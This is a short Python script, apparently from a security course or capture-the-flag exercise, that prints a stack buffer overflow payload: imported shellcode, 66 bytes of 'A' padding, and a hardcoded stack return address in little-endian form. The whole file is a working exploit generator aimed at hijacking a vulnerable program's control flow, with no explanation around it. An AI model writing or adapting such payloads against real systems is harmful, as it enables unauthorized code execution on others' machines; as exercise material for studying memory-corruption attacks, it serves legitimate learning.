#!/usr/bin/env python3

import sys

from shellcode import shellcode
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*66)
sys.stdout.buffer.write(0x7ffffff68530.to_bytes(8,'little'))
